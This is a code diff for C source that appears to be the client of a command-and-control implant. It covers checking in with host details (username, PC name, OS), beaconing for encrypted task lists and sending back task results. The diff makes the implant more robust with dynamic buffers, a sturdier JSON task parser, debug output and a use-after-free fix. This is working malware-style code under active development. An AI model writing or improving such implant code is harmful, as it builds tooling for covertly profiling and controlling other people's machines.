@@ -315,10 +315,17 @@ int protocol_checkin(CryptoContext *crypto, SystemInfo *info) {
   }
 
   // Build inner payload matching ClientIdentification struct
-  // Fields: id, version, operating_system, account_type, country, username,
-  // pc_name, tag
-  char inner_payload[768];
-  snprintf(inner_payload, sizeof(inner_payload),
+  // 动态分配避免固定缓冲区截断
+  const char *os_ver = info->os_version ? info->os_version : "";
+  const char *uname = info->username ? info->username : "";
+  const char *hname = info->hostname ? info->hostname : "";
+  const char *itag = info->tag ? info->tag : "";
+
+  size_t inner_size = 256 + strlen(g_client_id) + strlen(VERSION) +
+                      strlen(os_ver) + strlen(uname) + strlen(hname) +
+                      strlen(itag);
+  char *inner_payload = safe_malloc(inner_size);
+  snprintf(inner_payload, inner_size,
            "{\"id\":\"%s\","
            "\"version\":\"%s\","
            "\"operating_system\":\"%s\","
@@ -327,20 +334,21 @@ int protocol_checkin(CryptoContext *crypto, SystemInfo *info) {
            "\"username\":\"%s\","
            "\"pc_name\":\"%s\","
            "\"tag\":\"%s\"}",
-           g_client_id, VERSION, info->os_version ? info->os_version : "",
-           info->username ? info->username : "",
-           info->hostname ? info->hostname : "", info->tag ? info->tag : "");
+           g_client_id, VERSION, os_ver, uname, hname, itag);
 
   // Build C2Request format: {type, client_id, payload}
-  char payload[1024];
-  snprintf(payload, sizeof(payload),
+  size_t payload_size = 128 + strlen(g_client_id) + strlen(inner_payload);
+  char *payload = safe_malloc(payload_size);
+  snprintf(payload, payload_size,
            "{\"type\":\"checkin\","
            "\"client_id\":\"%s\","
            "\"payload\":%s}",
            g_client_id, inner_payload);
+  free(inner_payload);
 
   // Build request
   char *body = build_request_body(crypto, payload);
+  free(payload);
   if (!body) {
     DEBUG_PRINT("    [!] Failed to build request body\n");
     return -1;
@@ -404,13 +412,19 @@ int protocol_beacon(CryptoContext *crypto, Task **tasks, int *task_count) {
   char *decrypted = parse_response_body(crypto, response.body);
   http_response_free(&response);
 
-  if (!decrypted)
+  if (!decrypted) {
+    DEBUG_PRINT("    [DEBUG] parse_response_body returned NULL\n");
     return 0; // No tasks
+  }
+
+  DEBUG_PRINT("    [DEBUG] Decrypted beacon response (%zu bytes): %.300s\n",
+              strlen(decrypted), decrypted);
 
   // Parse tasks from decrypted JSON
   // Format: {"tasks":[{"id":"...","command":1,"args":"..."},...]}
   const char *tasks_start = strstr(decrypted, "\"tasks\":[");
   if (!tasks_start) {
+    DEBUG_PRINT("    [DEBUG] No 'tasks' key found in response\n");
     free(decrypted);
     return 0;
   }
@@ -418,10 +432,15 @@ int protocol_beacon(CryptoContext *crypto, Task **tasks, int *task_count) {
   // Count tasks (simple counting of "id" occurrences)
   int count = 0;
   const char *p = tasks_start;
+  DEBUG_PRINT("    [DEBUG] tasks_start offset: %d, remaining: %.100s\n",
+              (int)(tasks_start - decrypted), tasks_start);
   while ((p = strstr(p, "\"id\":")) != NULL) {
     count++;
+    DEBUG_PRINT("    [DEBUG] Found 'id' #%d at offset %d\n", count,
+                (int)(p - decrypted));
     p++;
   }
+  DEBUG_PRINT("    [DEBUG] Total id count: %d\n", count);
 
   if (count == 0) {
     free(decrypted);
@@ -439,9 +458,35 @@ int protocol_beacon(CryptoContext *crypto, Task **tasks, int *task_count) {
     if (!obj_start)
       break;
 
-    const char *obj_end = strchr(obj_start, '}');
-    if (!obj_end)
+    // 层级感知的括号匹配，支持 args 中包含 } 的情况
+    const char *scan = obj_start + 1;
+    int depth = 1;
+    int in_string = 0;
+    while (*scan && depth > 0) {
+      if (*scan == '"') {
+        // 计算引号前连续反斜杠的个数
+        int backslash_count = 0;
+        const char *bp = scan - 1;
+        while (bp >= obj_start && *bp == '\\') {
+          backslash_count++;
+          bp--;
+        }
+        // 偶数个反斜杠 = 引号未被转义（结束/开始字符串）
+        if (backslash_count % 2 == 0) {
+          in_string = !in_string;
+        }
+      } else if (!in_string) {
+        if (*scan == '{')
+          depth++;
+        else if (*scan == '}')
+          depth--;
+      }
+      if (depth > 0)
+        scan++;
+    }
+    if (depth != 0)
       break;
+    const char *obj_end = scan;
 
     // Extract fields
     size_t obj_len = obj_end - obj_start + 1;
@@ -500,8 +545,9 @@ int protocol_send_result(CryptoContext *crypto, const char *task_id,
                       strlen(body), &response);
   free(body);
 
+  int status = response.status_code;
   http_response_free(&response);
-  return (ret == 0 && response.status_code == 200) ? 0 : -1;
+  return (ret == 0 && status == 200) ? 0 : -1;
 }
 
 void protocol_free_tasks(Task *tasks, int count) {
